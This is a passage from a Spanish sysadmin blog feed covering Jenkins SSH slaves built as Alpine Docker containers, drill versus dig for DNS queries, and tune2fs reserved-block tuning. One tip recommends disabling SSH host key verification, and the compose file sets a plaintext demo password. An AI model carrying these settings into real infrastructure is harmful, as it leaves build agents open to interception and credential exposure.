    external: &lt;span class="nb"&gt;true&lt;/span&gt;
gerard@atlantis:~/workspace/jenkins$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Levantamos el &lt;strong&gt;jenkins&lt;/strong&gt; con &lt;code&gt;docker-compose up -d&lt;/code&gt; y nos vamos a su panel de trabajo en &lt;a href="http://atlantis:8080/"&gt;http://atlantis:8080/&lt;/a&gt;. La primera vez nos va a hacer varias preguntas para crear el usuario de administración y demás; esto es un &lt;strong&gt;jenkins&lt;/strong&gt; normal.&lt;/p&gt;
&lt;h2&gt;Unos slaves de ejemplo&lt;/h2&gt;
&lt;p&gt;Los &lt;em&gt;slaves&lt;/em&gt; son solamente máquinas con &lt;strong&gt;SSH&lt;/strong&gt; y &lt;strong&gt;Java&lt;/strong&gt; instalados; por supuesto, para entrar por &lt;strong&gt;SSH&lt;/strong&gt;, &lt;strong&gt;jenkins&lt;/strong&gt; va a necesitar un usuario y una contraseña Para no levantar más máquinas virtuales, vamos a crear estos &lt;em&gt;slaves&lt;/em&gt; como contenedores &lt;strong&gt;docker&lt;/strong&gt;, con un usuario y &lt;em&gt;password&lt;/em&gt; configurables (por si hubiera que cambiarlos en un futuro).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/workspace/base_worker$ cat Dockerfile
FROM alpine:3.8
RUN apk add --no-cache openssh openjdk8-jre
COPY start.sh /
CMD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/start.sh&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@atlantis:~/workspace/base_worker$
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/workspace/base_worker$ cat start.sh
&lt;span class="c1"&gt;#!/bin/sh&lt;/span&gt;

&lt;span class="k"&gt;for&lt;/span&gt; key in rsa ecdsa ed25519&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
    &lt;span class="nb"&gt;test&lt;/span&gt; -e /etc/ssh/ssh_host_&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;key&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;_key &lt;span class="o"&gt;||&lt;/span&gt; ssh-keygen -t &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;key&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; -N &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt; -f /etc/ssh/ssh_host_&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;key&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;_key -q
&lt;span class="k"&gt;done&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt; -n &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;SSH_USER&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
    adduser -D &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;SSH_USER&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
    &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;SSH_USER&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;:&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;SSH_PASSWORD&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; chpasswd
&lt;span class="k"&gt;fi&lt;/span&gt;

&lt;span class="nb"&gt;exec&lt;/span&gt; /usr/sbin/sshd -D -e
gerard@atlantis:~/workspace/base_worker$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Construimos la imagen y le damos el &lt;em&gt;tag&lt;/em&gt; &lt;code&gt;worker:base&lt;/code&gt;. Lo vamos a utilizar tal cual, pero una estrategia interesante sería extender esta imagen para añadir lo que se pueda necesitar. Eso daría pie a varios contenedores con diferentes herramientas de compilación; cada &lt;em&gt;job&lt;/em&gt; de &lt;strong&gt;jenkins&lt;/strong&gt; se configurará para usar las que puedan satisfacer sus comandos de construcción.&lt;/p&gt;
&lt;p&gt;Levantar dos instancias de estos &lt;em&gt;workers&lt;/em&gt; no entraña ninguna dificultad; lo importante es el &lt;code&gt;container_name&lt;/code&gt;, que es el nombre de DNS de la máquina dentro de la red &lt;code&gt;jenkins&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/workspace/workers$ cat docker-compose.yml
version: &lt;span class="s1"&gt;&amp;#39;3&amp;#39;&lt;/span&gt;
services:
  worker01:
    image: worker:base
    build: ../base_worker
    container_name: worker01
    hostname: worker01
    environment:
      SSH_USER: jenkins
      SSH_PASSWORD: s3cr3t
    networks:
      jenkins: &lt;span class="o"&gt;{}&lt;/span&gt;
  worker02:
    image: worker:base
    build: ../base_worker
    container_name: worker02
    hostname: worker02
    environment:
      SSH_USER: jenkins
      SSH_PASSWORD: s3cr3t
    networks:
      jenkins: &lt;span class="o"&gt;{}&lt;/span&gt;
networks:
  jenkins:
    external: &lt;span class="nb"&gt;true&lt;/span&gt;
gerard@atlantis:~/workspace/workers$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;De nuevo, levantamos ls &lt;em&gt;workers&lt;/em&gt; con &lt;code&gt;docker-compose up -d&lt;/code&gt; y ya los tenemos listos para ser usados.&lt;/p&gt;
&lt;h2&gt;Configurando Jenkins con los nuevos slaves&lt;/h2&gt;
&lt;p&gt;Para que &lt;strong&gt;jenkins&lt;/strong&gt; pueda controlar &lt;em&gt;slaves&lt;/em&gt; por &lt;strong&gt;SSH&lt;/strong&gt;, se necesita instalar el &lt;strong&gt;SSH Slaves plugin&lt;/strong&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Administrar Jenkins &amp;gt; Administrar Plugins &amp;gt; Todos los plugins&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Reiniciamos el &lt;strong&gt;jenkins&lt;/strong&gt; y ya tenemos todo lo necesario para seguir.&lt;/p&gt;
&lt;p&gt;Ahora se necesita configurar los nuevos nodos para que &lt;strong&gt;jenkins&lt;/strong&gt; los pueda monitorizar y controlar:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Administrar Jenkins &amp;gt; Administrar Nodos &amp;gt; Nuevo nodo&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Aquí solo hay que dar un nombre para identificarlo, el tipo "Permanent Agent" y el botón "OK". En la siguiente pantalla hay que rellenar la carpeta de trabajo, el nombre del equipo y las credenciales SSH. Tras guardar, solo queda esperar que el agente esté &lt;em&gt;online&lt;/em&gt; en la siguiente pantalla.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: Cuidado con la "Host Key Verification Strategy", que suele dar problemas de acceso por SSH. Yo suelo poner "Non verifying Verification Strategy".&lt;/p&gt;
&lt;p&gt;Al configurar cada proyecto, podremos elegir ejecutar en nodos concretos, con la opción "Restringir dónde se puede ejecutar este proyecto.". Esto nos permite elegir los nodos que puedan cumplir con nuestro &lt;em&gt;build&lt;/em&gt;; por ejemplo elegir un nodo con &lt;strong&gt;docker&lt;/strong&gt; para hacer un &lt;code&gt;docker build&lt;/code&gt; y un &lt;code&gt;docker push&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Con la imagen de &lt;em&gt;slave&lt;/em&gt; que hemos utilizado tenemos &lt;strong&gt;Java JRE&lt;/strong&gt; y los binarios propios de un &lt;strong&gt;Alpine Linux&lt;/strong&gt; básico, así que no esperéis mucho más...&lt;/p&gt;</content><category term="jenkins"></category><category term="docker"></category><category term="master"></category><category term="slave"></category></entry><entry><title>Una alternativa a dig: probando drill</title><link href="https://www.linuxsysadmin.ml/2018/10/una-alternativa-a-dig-probando-drill.html" rel="alternate"></link><published>2018-10-22T10:00:00+02:00</published><updated>2018-10-22T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-10-22:/2018/10/una-alternativa-a-dig-probando-drill.html</id><summary type="html">&lt;p&gt;Cuando trabajas con terceras partes, los problemas relacionados con la resolución DNS son demasiado habituales. Muchas veces utilizan DNS internos y cuando nos pasan los datos de conexión remota, no funciona nada. En estos casos, el procedimiento suele pasar por verificar primero la resolución DNS antes que la conectividad remota …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Cuando trabajas con terceras partes, los problemas relacionados con la resolución DNS son demasiado habituales. Muchas veces utilizan DNS internos y cuando nos pasan los datos de conexión remota, no funciona nada. En estos casos, el procedimiento suele pasar por verificar primero la resolución DNS antes que la conectividad remota.&lt;/p&gt;
&lt;p&gt;Para todas aquellas verificaciones que se lanzan contra los DNS, mi herramienta favorita &lt;em&gt;era&lt;/em&gt; &lt;strong&gt;dig&lt;/strong&gt;. Es completa, veraz, y te da toda la información de una sola pasada.&lt;/p&gt;
&lt;p&gt;Sin embargo, el otro día encontré su talón de aquiles: para no instalar nada en mi máquina, utilicé un contenedor de &lt;strong&gt;docker&lt;/strong&gt;, por supesto con &lt;strong&gt;Alpine Linux&lt;/strong&gt;. Para aquellos que no lo sepáis, &lt;strong&gt;Alpine Linux&lt;/strong&gt; usa una implementación de funciones DNS algo distinta de la habitual, y ello causa problemas relacionados con DNS.&lt;/p&gt;
&lt;p&gt;Aunque mejor lo mostramos en un ejemplo: partiremos de un contenedor &lt;strong&gt;Alpine Linux&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~$ docker run -ti --rm alpine:3.8
/ &lt;span class="c1"&gt;#&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;El problema&lt;/h2&gt;
&lt;p&gt;En este punto, el contenedor no tiene la herramienta &lt;strong&gt;dig&lt;/strong&gt; instalada, aunque lo podemos corregir de forma fácil:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/ &lt;span class="c1"&gt;# apk add --no-cache bind-tools&lt;/span&gt;
fetch http://dl-cdn.alpinelinux.org/alpine/v3.8/main/x86_64/APKINDEX.tar.gz
fetch http://dl-cdn.alpinelinux.org/alpine/v3.8/community/x86_64/APKINDEX.tar.gz
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;/5&lt;span class="o"&gt;)&lt;/span&gt; Installing libgcc &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;.4.0-r8&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;/5&lt;span class="o"&gt;)&lt;/span&gt; Installing json-c &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.13.1-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;/5&lt;span class="o"&gt;)&lt;/span&gt; Installing libxml2 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.9.8-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt;/5&lt;span class="o"&gt;)&lt;/span&gt; Installing bind-libs &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;9&lt;/span&gt;.12.2_p1-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;/5&lt;span class="o"&gt;)&lt;/span&gt; Installing bind-tools &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;9&lt;/span&gt;.12.2_p1-r0&lt;span class="o"&gt;)&lt;/span&gt;
Executing busybox-1.28.4-r1.trigger
OK: &lt;span class="m"&gt;9&lt;/span&gt; MiB in &lt;span class="m"&gt;18&lt;/span&gt; packages
/ &lt;span class="c1"&gt;#&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Lanzamos una &lt;em&gt;query&lt;/em&gt; DNS bastante normal, y obtenemos los resultados.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/ &lt;span class="c1"&gt;# dig www.google.com&lt;/span&gt;

&lt;span class="p"&gt;;&lt;/span&gt; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG &lt;span class="m"&gt;9&lt;/span&gt;.12.2-P1 &amp;lt;&amp;lt;&amp;gt;&amp;gt; www.google.com
&lt;span class="p"&gt;;;&lt;/span&gt; global options: +cmd
&lt;span class="p"&gt;;;&lt;/span&gt; Got answer:
&lt;span class="p"&gt;;;&lt;/span&gt; -&amp;gt;&amp;gt;HEADER&lt;span class="s"&gt;&amp;lt;&amp;lt;- opco&lt;/span&gt;de: QUERY, status: FORMERR, id: &lt;span class="m"&gt;60730&lt;/span&gt;
&lt;span class="p"&gt;;;&lt;/span&gt; flags: qr rd&lt;span class="p"&gt;;&lt;/span&gt; QUERY: &lt;span class="m"&gt;1&lt;/span&gt;, ANSWER: &lt;span class="m"&gt;0&lt;/span&gt;, AUTHORITY: &lt;span class="m"&gt;0&lt;/span&gt;, ADDITIONAL: &lt;span class="m"&gt;1&lt;/span&gt;
...
/ &lt;span class="c1"&gt;#&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Leemos la respuesta y vemos algo raro: "ANSWER: 0". No, no se ha acabado el mundo, Google funciona bien, pero nuestra herramienta no.&lt;/p&gt;
&lt;p&gt;Esto pasa porque &lt;strong&gt;musl libc&lt;/strong&gt; se limita a lanzar la &lt;em&gt;query&lt;/em&gt; contra el primer servidor DNS de nuestro &lt;code&gt;/etc/resolv.conf&lt;/code&gt;, que no es el único.&lt;/p&gt;
&lt;h2&gt;La alternativa&lt;/h2&gt;
&lt;p&gt;Estaba yo a punto de tirar la toalla y usar un contenedor con otra distribución, pero topé casi por casualidad con otra herramienta: &lt;strong&gt;drill&lt;/strong&gt;.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The name drill is a pun on dig. With drill you should be able get even more information than with dig.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Se trata de una versión mejorada de &lt;strong&gt;dig&lt;/strong&gt;, así que vale la pena intentarlo de nuevo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/ &lt;span class="c1"&gt;# apk add --no-cache drill&lt;/span&gt;
fetch http://dl-cdn.alpinelinux.org/alpine/v3.8/main/x86_64/APKINDEX.tar.gz
fetch http://dl-cdn.alpinelinux.org/alpine/v3.8/community/x86_64/APKINDEX.tar.gz
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;/2&lt;span class="o"&gt;)&lt;/span&gt; Installing ldns &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.7.0-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;/2&lt;span class="o"&gt;)&lt;/span&gt; Installing drill &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.7.0-r0&lt;span class="o"&gt;)&lt;/span&gt;
Executing busybox-1.28.4-r1.trigger
OK: &lt;span class="m"&gt;10&lt;/span&gt; MiB in &lt;span class="m"&gt;20&lt;/span&gt; packages
/ &lt;span class="c1"&gt;#&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;La misma &lt;em&gt;query&lt;/em&gt; nos da un resultado correcto:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/ &lt;span class="c1"&gt;# drill www.google.com&lt;/span&gt;
&lt;span class="p"&gt;;;&lt;/span&gt; -&amp;gt;&amp;gt;HEADER&lt;span class="s"&gt;&amp;lt;&amp;lt;- opco&lt;/span&gt;de: QUERY, rcode: NOERROR, id: &lt;span class="m"&gt;46447&lt;/span&gt;
&lt;span class="p"&gt;;;&lt;/span&gt; flags: qr rd ra &lt;span class="p"&gt;;&lt;/span&gt; QUERY: &lt;span class="m"&gt;1&lt;/span&gt;, ANSWER: &lt;span class="m"&gt;1&lt;/span&gt;, AUTHORITY: &lt;span class="m"&gt;0&lt;/span&gt;, ADDITIONAL: &lt;span class="m"&gt;0&lt;/span&gt;
&lt;span class="p"&gt;;;&lt;/span&gt; QUESTION SECTION:
&lt;span class="p"&gt;;;&lt;/span&gt; www.google.com.      IN      A

&lt;span class="p"&gt;;;&lt;/span&gt; ANSWER SECTION:
www.google.com. &lt;span class="m"&gt;97&lt;/span&gt;      IN      A       &lt;span class="m"&gt;216&lt;/span&gt;.58.201.228
...
/ &lt;span class="c1"&gt;#&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Conclusión&lt;/h2&gt;
&lt;p&gt;Tenemos dos herramientas para consulta de DNS, que son &lt;strong&gt;dig&lt;/strong&gt; y &lt;strong&gt;drill&lt;/strong&gt;. Considerando que &lt;strong&gt;drill&lt;/strong&gt; es más completa y más correcta que &lt;strong&gt;dig&lt;/strong&gt;, no hay siquiera punto de comparación.&lt;/p&gt;
&lt;p&gt;A nivel de dependencias necesarias, &lt;strong&gt;drill&lt;/strong&gt; también sobresale: necesita menos paquetes y nos da contenedores más pequeños:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~$ docker ps -s
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES               SIZE
e4fa4f7afb11        alpine:3.8          &lt;span class="s2"&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;           &lt;span class="m"&gt;40&lt;/span&gt; seconds ago      Up &lt;span class="m"&gt;39&lt;/span&gt; seconds                           dig                 &lt;span class="m"&gt;5&lt;/span&gt;.05MB &lt;span class="o"&gt;(&lt;/span&gt;virtual &lt;span class="m"&gt;9&lt;/span&gt;.47MB&lt;span class="o"&gt;)&lt;/span&gt;
9f9a7b248f62        alpine:3.8          &lt;span class="s2"&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;           &lt;span class="m"&gt;43&lt;/span&gt; seconds ago      Up &lt;span class="m"&gt;42&lt;/span&gt; seconds                           drill               &lt;span class="m"&gt;1&lt;/span&gt;.7MB &lt;span class="o"&gt;(&lt;/span&gt;virtual &lt;span class="m"&gt;6&lt;/span&gt;.12MB&lt;span class="o"&gt;)&lt;/span&gt;
gerard@atlantis:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Así pues, bienvenido &lt;strong&gt;drill&lt;/strong&gt; y hasta otra &lt;strong&gt;dig&lt;/strong&gt;.&lt;/p&gt;</content><category term="drill"></category><category term="dig"></category><category term="dns"></category></entry><entry><title>Ajustando bloques de disco reservado con tune2fs</title><link href="https://www.linuxsysadmin.ml/2018/09/ajustando-bloques-de-disco-reservado-con-tune2fs.html" rel="alternate"></link><published>2018-09-03T10:00:00+02:00</published><updated>2018-09-03T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-09-03:/2018/09/ajustando-bloques-de-disco-reservado-con-tune2fs.html</id><summary type="html">&lt;p&gt;Llega el momento que tantas veces hemos repetido: montamos un servidor para una función concreta, y le asignamos un disco o partición a la carpeta que va a alojar la cantidad creciente de datos necesarios. De repente nos fijamos en que la capacidad del disco se ha perdido tras formatear …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Llega el momento que tantas veces hemos repetido: montamos un servidor para una función concreta, y le asignamos un disco o partición a la carpeta que va a alojar la cantidad creciente de datos necesarios. De repente nos fijamos en que la capacidad del disco se ha perdido tras formatear.&lt;/p&gt;
&lt;p&gt;No, no es una broma; solo tenemos que ver un ejemplo. Supongamos que asignamos un disco de 1 terabyte (no son difíciles ni caros de comprar hoy en día) a una máquina que lo va a necesitar para alojar todo lo referente a un entorno con &lt;strong&gt;docker&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@docker:~$ df -h
S.ficheros     Tamaño Usados  Disp Uso% Montado en
...
/dev/sda1        &lt;span class="m"&gt;7&lt;/span&gt;,9G   &lt;span class="m"&gt;1&lt;/span&gt;,3G  &lt;span class="m"&gt;6&lt;/span&gt;,2G  &lt;span class="m"&gt;17&lt;/span&gt;% /
/dev/sdb1       1007G    77M  956G   &lt;span class="m"&gt;1&lt;/span&gt;% /var/lib/docker
gerard@docker:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;¿Véis en &lt;code&gt;/dev/sdb1&lt;/code&gt; que el tamaño usado y el disponible no coinciden con el tamaño del disco? Hay 50 gigabytes desaparecidos!&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Este es un fenómeno que se da al formatear un disco con formato ext2, ext3 o ext4. Esto es así porque, muchas veces, este tipo de particiones sirven para alojar ficheros de sistema. Cuando estas particiones se llenan, el sistema deja de funcionar como es debido.&lt;/p&gt;
&lt;p&gt;La solución que los desarrolladores de los sistemas de ficheros extX encontraron fue la de reservar un bloque del disco (un 5% por defecto) al que solo puede acceder &lt;strong&gt;root&lt;/strong&gt; o algún servicio que ejecute como &lt;strong&gt;root&lt;/strong&gt;. Esto es fácil de comprobar:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@docker:~$ sudo tune2fs -l /dev/sdb1 &lt;span class="p"&gt;|&lt;/span&gt; egrep -i &lt;span class="s2"&gt;&amp;quot;block (count|size)&amp;quot;&lt;/span&gt;
Block count:              &lt;span class="m"&gt;268435200&lt;/span&gt;
Reserved block count:     &lt;span class="m"&gt;13421760&lt;/span&gt;
Block size:               &lt;span class="m"&gt;4096&lt;/span&gt;
gerard@docker:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vemos que se han reservado 13421760 bloques de 4096 bytes (un 5% de todos los bloques). Usando la calculadora, nos salen 51,2 gigabytes, que es la cantidad en la que difiere el comando &lt;code&gt;df&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Como esta partición no necesita un trato especial si se llena, podemos reducir el porcentaje de bloques reservados, exactamente a 0:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@docker:~$ sudo tune2fs -m &lt;span class="m"&gt;0&lt;/span&gt; /dev/sdb1
tune2fs &lt;span class="m"&gt;1&lt;/span&gt;.43.4 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;31&lt;/span&gt;-Jan-2017&lt;span class="o"&gt;)&lt;/span&gt;
Se pone el porcentaje de bloques reservados a &lt;span class="m"&gt;0&lt;/span&gt;% &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt; bloques&lt;span class="o"&gt;)&lt;/span&gt;
gerard@docker:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Si volvemos a mirar con &lt;code&gt;tune2fs&lt;/code&gt; los bloques reservados, veremos que ya no se reserva ninguno, que es el 0% solicitado.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@docker:~$ sudo tune2fs -l /dev/sdb1 &lt;span class="p"&gt;|&lt;/span&gt; egrep -i &lt;span class="s2"&gt;&amp;quot;block (count|size)&amp;quot;&lt;/span&gt;
Block count:              &lt;span class="m"&gt;268435200&lt;/span&gt;
Reserved block count:     &lt;span class="m"&gt;0&lt;/span&gt;
Block size:               &lt;span class="m"&gt;4096&lt;/span&gt;
gerard@docker:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Un nuevo vistazo con el comando &lt;code&gt;df&lt;/code&gt; nos mostrará que ya no hay 50gb desaparecidos:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@docker:~$ df -h
S.ficheros     Tamaño Usados  Disp Uso% Montado en
...
/dev/sda1        &lt;span class="m"&gt;7&lt;/span&gt;,9G   &lt;span class="m"&gt;1&lt;/span&gt;,3G  &lt;span class="m"&gt;6&lt;/span&gt;,2G  &lt;span class="m"&gt;17&lt;/span&gt;% /
/dev/sdb1       1007G    77M 1007G   &lt;span class="m"&gt;1&lt;/span&gt;% /var/lib/docker
gerard@docker:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Puestos a revisar el tamaño de la reserva, podemos mirar la partición &lt;code&gt;/dev/sda1&lt;/code&gt;. En esta partición reside el sistema operativo, y necesita algunos bloques reservados, por si acaso. Sin embargo, el tamaño de los discos crece y el tamaño reservado de forma porcentual, también; no es lo mismo reservar el 5% de 4gb que de 400gb...&lt;/p&gt;
&lt;p&gt;Personalmente creo que hay que dejar algún bloque reservado, pero con una partición de 8gb, el 5% son 400mb. Esto me parece una barbaridad, y creo que sobra espacio de emergencia. Si bajamos ese porcentaje al 1%, estaríamos hablando de 80mb de reserva, que son más que suficientes para acceder a liberar espacio si se llenara.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@docker:~$ sudo tune2fs -m &lt;span class="m"&gt;1&lt;/span&gt; /dev/sda1
tune2fs &lt;span class="m"&gt;1&lt;/span&gt;.43.4 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;31&lt;/span&gt;-Jan-2017&lt;span class="o"&gt;)&lt;/span&gt;
Se pone el porcentaje de bloques reservados a &lt;span class="m"&gt;1&lt;/span&gt;% &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;20966&lt;/span&gt; bloques&lt;span class="o"&gt;)&lt;/span&gt;
gerard@docker:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora podemos verificar que los bloques reservados bajan al 1%, lo que nos deja con 20966 bloques de 4096 bytes (unos 82mb).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@docker:~$ sudo tune2fs -l /dev/sda1 &lt;span class="p"&gt;|&lt;/span&gt; egrep -i &lt;span class="s2"&gt;&amp;quot;block (count|size)&amp;quot;&lt;/span&gt;
Block count:              &lt;span class="m"&gt;2096640&lt;/span&gt;
Reserved block count:     &lt;span class="m"&gt;20966&lt;/span&gt;
Block size:               &lt;span class="m"&gt;4096&lt;/span&gt;
gerard@docker:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Así pues, liberamos unos 320mb, lo que nos deja algo más de espacio para lo que podamos necesitar.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@docker:~$ df -h
S.ficheros     Tamaño Usados  Disp Uso% Montado en
...
/dev/sda1        &lt;span class="m"&gt;7&lt;/span&gt;,9G   &lt;span class="m"&gt;1&lt;/span&gt;,3G  &lt;span class="m"&gt;6&lt;/span&gt;,5G  &lt;span class="m"&gt;17&lt;/span&gt;% /
/dev/sdb1       1007G    77M 1007G   &lt;span class="m"&gt;1&lt;/span&gt;% /var/lib/docker
gerard@docker:~$
&lt;/pre&gt;&lt;/div&gt;</content><category term="bloques reservados"></category><category term="tune2fs"></category></entry><entry><title>Deshaciéndome del historial de comandos en Bash</title><link href="https://www.linuxsysadmin.ml/2018/08/deshaciendome-del-historial-de-comandos-en-bash.html" rel="alternate"></link><published>2018-08-27T10:00:00+02:00</published><updated>2018-08-27T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-08-27:/2018/08/deshaciendome-del-historial-de-comandos-en-bash.html</id><summary type="html">&lt;p&gt;Muchas veces me pregunto para qué necesito guardar un histórico de comandos en mis sesiones de &lt;strong&gt;bash&lt;/strong&gt;. Como no soy nada repetitivo con los comandos que uso, solo se trata de basura acumulándose en &lt;code&gt;~/.bash_history&lt;/code&gt;, y un riesgo innecesario de que otros usuarios puedan chafardear los comandos que voy utilizando …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Muchas veces me pregunto para qué necesito guardar un histórico de comandos en mis sesiones de &lt;strong&gt;bash&lt;/strong&gt;. Como no soy nada repetitivo con los comandos que uso, solo se trata de basura acumulándose en &lt;code&gt;~/.bash_history&lt;/code&gt;, y un riesgo innecesario de que otros usuarios puedan chafardear los comandos que voy utilizando.&lt;/p&gt;
&lt;p&gt;¿Pero como funciona el mecanismo de &lt;em&gt;history&lt;/em&gt; en &lt;strong&gt;bash&lt;/strong&gt;?&lt;/p&gt;
&lt;ol&gt;
